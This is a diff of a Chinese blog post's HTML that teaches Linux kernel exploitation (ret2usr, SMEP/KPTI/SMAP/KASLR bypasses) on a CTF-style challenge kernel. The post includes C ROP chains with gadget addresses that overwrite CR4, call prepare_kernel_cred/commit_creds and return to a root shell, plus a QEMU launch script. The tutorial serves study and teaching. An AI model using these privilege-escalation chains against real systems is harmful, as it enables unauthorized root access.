-<li><code>system(&quot;/bin/sh&quot;)</code> 这个函数是用户态的 libc 代码，执行时它会认为自己仍然在 Ring 3（但实际上是 Ring 0）。</li>
-<li><strong>因为没有切换回用户态，进程仍然在 Ring 0 执行</strong>，但 libc 代码假设它在用户态，可能会导致非法访问内核地址，或者崩溃。</li>
-</ul>
-</li>
-<li><strong>可能访问非法地址</strong><ul>
-<li><code>system()</code> 需要用户态的栈，如果它访问用户态的 <code>RSP</code>，但 <code>RSP</code> 仍然是内核态栈，可能会导致崩溃。</li>
-</ul>
-</li>
-<li><strong>可能执行 <code>syscall</code>，导致未知行为</strong><ul>
-<li><code>system()</code> 依赖 <code>execve()</code>，会执行 <code>syscall</code>，但 <strong>在内核态执行 <code>syscall</code> 会导致崩溃</strong>，因为 <code>syscall</code> 只能从用户态触发。</li>
-</ul>
-</li>
+<p>如果<strong>控制了内核态的 RIP</strong>，并且直接让 <code>RIP</code>
+指向 <code>system("/bin/sh")</code> 这样的 libc
+函数，会发生以下情况：</p>
+<ol type="1">
+<li><strong>system() 仍然在内核态运行</strong>
+<ul>
+<li><code>system("/bin/sh")</code> 这个函数是用户态的 libc
+代码，执行时它会认为自己仍然在 Ring 3（但实际上是 Ring 0）。</li>
+<li><strong>因为没有切换回用户态，进程仍然在 Ring 0 执行</strong>，但
+libc 代码假设它在用户态，可能会导致非法访问内核地址，或者崩溃。</li>
+</ul></li>
+<li><strong>可能访问非法地址</strong>
+<ul>
+<li><code>system()</code> 需要用户态的栈，如果它访问用户态的
+<code>RSP</code>，但 <code>RSP</code>
+仍然是内核态栈，可能会导致崩溃。</li>
+</ul></li>
+<li><strong>可能执行 <code>syscall</code>，导致未知行为</strong>
+<ul>
+<li><code>system()</code> 依赖 <code>execve()</code>，会执行
+<code>syscall</code>，但 <strong>在内核态执行 <code>syscall</code>
+会导致崩溃</strong>，因为 <code>syscall</code> 只能从用户态触发。</li>
+</ul></li>
 </ol>
 <p>所以我们完成提权后还需着陆用户态。</p>
-<h4 id="smep保护绕过"><a href="#smep保护绕过" class="headerlink" title="smep保护绕过"></a>smep保护绕过</h4><p>首先我们要了解smep保护开启与否与CR4寄存器的值密切相关。当 CR4 寄存器的第 20 位是 1 时，保护开启；是 0 时，保护关闭。</p>
+<h4 id="smep保护绕过">smep保护绕过</h4>
+<p>首先我们要了解smep保护开启与否与CR4寄存器的值密切相关。当 CR4
+寄存器的第 20 位是 1 时，保护开启；是 0 时，保护关闭。</p>
 <img  
                      lazyload
                      src="/images/loading.svg"
@@ -822,8 +850,10 @@
                      data-src="/blog/2025/03/09/ret2usr%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E4%BB%A5%E5%8F%8A%E5%B8%B8%E8%A7%81%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90/image-20250301150749543.png"
                       class=""
                 >
-<p>比如我找了<code>pop rdi;ret</code>的gadget，然后就能完全控制cr4寄存器的值了。为了关闭 smep 保护，常用一个固定值 <code>0x6f0</code>，即 <code>mov cr4, 0x6f0</code>。从 <code>0x6f0</code> 可以看出它 <strong>启用了以下 CR4 位</strong>：</p>
-<div class="table-container">
+<p>比如我找了<code>pop rdi;ret</code>的gadget，然后就能完全控制cr4寄存器的值了。为了关闭
+smep 保护，常用一个固定值 <code>0x6f0</code>，即
+<code>mov cr4, 0x6f0</code>。从 <code>0x6f0</code> 可以看出它
+<strong>启用了以下 CR4 位</strong>：</p>
 <table>
 <thead>
 <tr>
@@ -865,7 +895,6 @@
 </tr>
 </tbody>
 </table>
-</div>
 <p>这些是正常的系统默认启用的 CPU 特性，并不会影响漏洞利用。</p>
 <p>rop更改如下，然后就能正常直接走ret2usr：</p>
 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">for(i = 0; i &lt; 10; i++)</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    rop[i] = canary;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">rop[i++] = (size_t)getPrivilege;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">rop[i++] = 0xffffffff81a012da + offset; // swapgs; popfq; ret</span></span><br><span class="line"><span class="comment">rop[i++] = 0;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">rop[i++] = 0xffffffff81050ac2 + offset; // iretq; ret; </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">rop[i++] = (size_t)spawn_shell;       // rip </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">rop[i++] = user_cs;</span></span><br><span class="line"><span class="comment">rop[i++] = user_rflags;</span></span><br><span class="line"><span class="comment">rop[i++] = user_sp;</span></span><br><span class="line"><span class="comment">rop[i++] = user_ss;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">    rop[i] = canary;</span><br><span class="line">&#125;</span><br><span class="line">rop[i++] = <span class="number">0xffffffff81000b2f</span> + offset;     <span class="comment">//pop rdi; ret</span></span><br><span class="line">rop[i++] = <span class="number">0x6f0</span>;</span><br><span class="line"></span><br><span class="line">rop[i++] = <span class="number">0xffffffff81075014</span> + offset;      <span class="comment">// mov cr4, rdi; push rdx; popfq; ret;</span></span><br><span class="line"></span><br><span class="line">rop[i++] = (<span class="type">size_t</span>)getPrivilege;</span><br><span class="line"></span><br><span class="line">rop[i++] = <span class="number">0xffffffff81a012da</span> + offset; <span class="comment">// swapgs; popfq; ret</span></span><br><span class="line">rop[i++] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">rop[i++] = <span class="number">0xffffffff81050ac2</span> + offset; <span class="comment">// iretq; ret; </span></span><br><span class="line"></span><br><span class="line">rop[i++] = (<span class="type">size_t</span>)spawn_shell;       <span class="comment">// rip </span></span><br><span class="line"></span><br><span class="line">rop[i++] = user_cs;</span><br><span class="line">rop[i++] = user_rflags;</span><br><span class="line">rop[i++] = user_sp;</span><br><span class="line">rop[i++] = user_ss;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
@@ -889,22 +918,39 @@
                      data-src="/blog/2025/03/09/ret2usr%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E4%BB%A5%E5%8F%8A%E5%B8%B8%E8%A7%81%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90/image-20250301170816953.png"
                       class=""
                 >
-<p>但实际上现代内核中通常会采用“CR4钉住”（CR4 pinning）的机制，使得即使你尝试修改这些位（包括SMAP和SMEP相关位），内核会自动恢复它们的固定状态，从而防止这种简单的修改。所以现在ret2usr这种利用手法已经几乎失效了，一般只能走内核ROP，比如用后述kpti得绕过方法。</p>
-<h4 id="kpti保护绕过"><a href="#kpti保护绕过" class="headerlink" title="kpti保护绕过"></a>kpti保护绕过</h4><p>KPTI（Kernel Page-Table Isolation，内核页表隔离）是一种 <strong>安全防御机制</strong>，用于 <strong>防止内核地址泄露</strong>，主要是为了 <strong>缓解 Meltdown 漏洞</strong>（CVE-2017-5754）。</p>
+<p>但实际上现代内核中通常会采用“CR4钉住”（CR4
+pinning）的机制，使得即使你尝试修改这些位（包括SMAP和SMEP相关位），内核会自动恢复它们的固定状态，从而防止这种简单的修改。所以现在ret2usr这种利用手法已经几乎失效了，一般只能走内核ROP，比如用后述kpti得绕过方法。</p>
+<h4 id="kpti保护绕过">kpti保护绕过</h4>
+<p>KPTI（Kernel Page-Table Isolation，内核页表隔离）是一种
+<strong>安全防御机制</strong>，用于
+<strong>防止内核地址泄露</strong>，主要是为了 <strong>缓解 Meltdown
+漏洞</strong>（CVE-2017-5754）。</p>
 <p>在 <strong>启用 KPTI</strong> 的系统上：</p>
 <ul>
-<li>用户态运行时，<strong>完全隔离</strong> 内核的页表，防止用户态进程访问或推测出内核地址。</li>
-<li>只有在 <strong>发生系统调用（syscall）、中断或异常</strong> 时，才会 <strong>切换到内核页表</strong> 进行内核代码执行。</li>
+<li>用户态运行时，<strong>完全隔离</strong>
+内核的页表，防止用户态进程访问或推测出内核地址。</li>
+<li>只有在 <strong>发生系统调用（syscall）、中断或异常</strong> 时，才会
+<strong>切换到内核页表</strong> 进行内核代码执行。</li>
 </ul>
-<p>在 <strong>未启用 KPTI</strong> 的情况下，<code>CR3</code> 指向的页表包含 <strong>用户态和内核态的地址映射</strong>。<br><strong>问题</strong>：Meltdown 攻击可以利用 CPU 的 <strong>推测执行漏洞</strong>，从用户态<strong>读取</strong>本应受保护的 <strong>内核地址</strong>！</p>
-<p> <strong>KPTI 通过修改 <code>CR3</code> 来隔离页表：</strong></p>
+<p>在 <strong>未启用 KPTI</strong> 的情况下，<code>CR3</code>
+指向的页表包含 <strong>用户态和内核态的地址映射</strong>。
+<strong>问题</strong>：Meltdown 攻击可以利用 CPU 的
+<strong>推测执行漏洞</strong>，从用户态<strong>读取</strong>本应受保护的
+<strong>内核地址</strong>！</p>
+<p><strong>KPTI 通过修改 <code>CR3</code> 来隔离页表：</strong></p>
 <ul>
-<li>用户态执行时：<code>CR3</code> 只加载 <strong>用户页表</strong>（不包含内核页表）。</li>
-<li>进入内核态时（如 <code>syscall</code>）：<code>CR3</code> 切换到 <strong>完整页表</strong>（包含用户和内核页表）。</li>
+<li>用户态执行时：<code>CR3</code> 只加载
+<strong>用户页表</strong>（不包含内核页表）。</li>
+<li>进入内核态时（如 <code>syscall</code>）：<code>CR3</code> 切换到
+<strong>完整页表</strong>（包含用户和内核页表）。</li>
 </ul>
 <p>KPTI保护机制的绕过主要包括异常处理以及页表切换两种绕过利用手法，到了kpti这种保护时其实我们的ret2usr手法已经不能生效了，需要构建内核ROP并绕过限制，我们还是以上面的题目为例，启动脚本加上<code>kpti=1</code>来启用页表隔离，注意这里cpu参数中用的是kvm64模型（这个模型默认kpti是开启的，这里手动指定方便查看），之前的qemu64-v1会启动不了kpti。</p>
 <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64 \</span><br><span class="line">-m 256M \</span><br><span class="line">-kernel ./bzImage \</span><br><span class="line">-initrd  ./mycore.cpio \</span><br><span class="line">-cpu kvm64,+smep \</span><br><span class="line">-append <span class="string">&quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr kpti=1&quot;</span> \</span><br><span class="line">-s  \</span><br><span class="line">-netdev user,<span class="built_in">id</span>=t0, -device e1000,netdev=t0,<span class="built_in">id</span>=nic0 \</span><br><span class="line">-nographic  \</span><br></pre></td></tr></table></figure></div>
-<h5 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h5><p>首先我们来看看如果不用异常处理，而是直接ROP着陆用户态执行用户代码，那么最后会爆<strong>Segmentation fault</strong>。这是因为在 KPTI 启用的情况下，用户态和内核态的 <code>CR3</code> <strong>必须</strong>正确切换，否则CPU <strong>仍然使用内核页表访问用户态地址</strong>，就会崩溃。</p>
+<h5 id="异常处理">异常处理</h5>
+<p>首先我们来看看如果不用异常处理，而是直接ROP着陆用户态执行用户代码，那么最后会爆<strong>Segmentation
+fault</strong>。这是因为在 KPTI 启用的情况下，用户态和内核态的
+<code>CR3</code> <strong>必须</strong>正确切换，否则CPU
+<strong>仍然使用内核页表访问用户态地址</strong>，就会崩溃。</p>
 <img  
                      lazyload
                      src="/images/loading.svg"
@@ -919,7 +965,11 @@
                      data-src="/blog/2025/03/09/ret2usr%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E4%BB%A5%E5%8F%8A%E5%B8%B8%E8%A7%81%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90/image-20250301211900339.png"
                       class=""
                 >
-<h5 id="页表切换"><a href="#页表切换" class="headerlink" title="页表切换"></a>页表切换</h5><p>借鉴之前改cr4寄存器实现绕过smep的方式，这里我们可以通过操作cr3寄存器实现kpti的绕过。这种方式用的是<strong>swapgs_restore_regs_and_return_to_usermode</strong>函数，这个函数是 <strong>Linux 内核</strong> 在 <strong>从内核态返回用户态</strong> 时使用的一个关键函数，它主要用于 <strong>处理 KPTI（Kernel Page Table Isolation）</strong> 以及 <strong>恢复用户态寄存器</strong>。</p>
+<h5 id="页表切换">页表切换</h5>
+<p>借鉴之前改cr4寄存器实现绕过smep的方式，这里我们可以通过操作cr3寄存器实现kpti的绕过。这种方式用的是<strong>swapgs_restore_regs_and_return_to_usermode</strong>函数，这个函数是
+<strong>Linux 内核</strong> 在 <strong>从内核态返回用户态</strong>
+时使用的一个关键函数，它主要用于 <strong>处理 KPTI（Kernel Page Table
+Isolation）</strong> 以及 <strong>恢复用户态寄存器</strong>。</p>
 <p>该函数的内部存在修改<code>CR3</code>的操作，因此只需要调用该函数，就可以从内核空间的页表修改为用户空间的页表。这里有个小trick，就是能够从该函数偏移0x16处开始执行，因为前面是一排弹栈操作，十分吃ROP空间，而且对后面影响不大。最后注意调用该函数+0x16时，最后还会从栈上弹两个地址，需要我们填充。</p>
 <img  
                      lazyload
@@ -948,10 +998,13 @@
                       class=""
                 >
 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ROP</span></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">    rop[i] = canary;</span><br><span class="line">&#125;</span><br><span class="line">rop[i++] = <span class="number">0xffffffff81000b2f</span> + offset; <span class="comment">// pop rdi; ret</span></span><br><span class="line">rop[i++] = <span class="number">0</span>;</span><br><span class="line">rop[i++] = prepare_kernel_cred;         <span class="comment">// prepare_kernel_cred(0)</span></span><br><span class="line"></span><br><span class="line">rop[i++] = <span class="number">0xffffffff810a0f49</span> + offset; <span class="comment">// pop rdx; ret</span></span><br><span class="line">rop[i++] = <span class="number">0xffffffff81021e53</span> + offset; <span class="comment">// pop rcx; ret</span></span><br><span class="line">rop[i++] = <span class="number">0xffffffff8101aa6a</span> + offset; <span class="comment">// mov rdi, rax; call rdx; </span></span><br><span class="line">rop[i++] = commit_creds;</span><br><span class="line"></span><br><span class="line"><span class="comment">// rop[i++] = 0xffffffff81a012da + offset; // swapgs; popfq; ret</span></span><br><span class="line"><span class="comment">// rop[i++] = 0;</span></span><br><span class="line"><span class="comment">// rop[i++] = 0xffffffff81050ac2 + offset; // iretq; ret; </span></span><br><span class="line"></span><br><span class="line">rop[i++] = <span class="number">0xffffffff81a008da</span> + offset + <span class="number">0x16</span>; <span class="comment">// swapgs_restore_regs_and_return_to_usermode</span></span><br><span class="line">rop[i++] = <span class="number">0</span>;</span><br><span class="line">rop[i++] = <span class="number">0</span>;</span><br><span class="line">rop[i++] = (<span class="type">size_t</span>)spawn_shell;         <span class="comment">// rip </span></span><br><span class="line"></span><br><span class="line">rop[i++] = user_cs;</span><br><span class="line">rop[i++] = user_rflags;</span><br><span class="line">rop[i++] = user_sp;</span><br><span class="line">rop[i++] = user_ss;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
-<h4 id="smap保护绕过"><a href="#smap保护绕过" class="headerlink" title="smap保护绕过"></a>smap保护绕过</h4><p>SMAP，全称 <strong>Supervisor Mode Access Prevention</strong>，是一种硬件安全机制，主要用于防止内核意外或恶意地访问用户空间内存。</p>
+<h4 id="smap保护绕过">smap保护绕过</h4>
+<p>SMAP，全称 <strong>Supervisor Mode Access
+Prevention</strong>，是一种硬件安全机制，主要用于防止内核意外或恶意地访问用户空间内存。</p>
 <p>此时使用<code>swapgs_restore_regs_and_return_to_usermode</code>函数也是完全可以绕过的，因此可以直接使用它构建<code>ROP</code>链。</p>
 <p>若rop长度不够需要栈迁移，则需要更加精巧的手段，我们放到以后学习。</p>
-<h4 id="kaslr保护绕过"><a href="#kaslr保护绕过" class="headerlink" title="kaslr保护绕过"></a>kaslr保护绕过</h4><p>与正常pwn题的aslr绕过类似，需要找到漏洞点泄露地址，进而算出基址，与用户态下的利用没有区别。</p>
+<h4 id="kaslr保护绕过">kaslr保护绕过</h4>
+<p>与正常pwn题的aslr绕过类似，需要找到漏洞点泄露地址，进而算出基址，与用户态下的利用没有区别。</p>
 
 		</div>
 
@@ -1109,7 +1162,7 @@
                     </span>
                     
                         <span>
-                            共 120k 字
+                            共 118.7k 字
                         </span>
                     
                 </p>
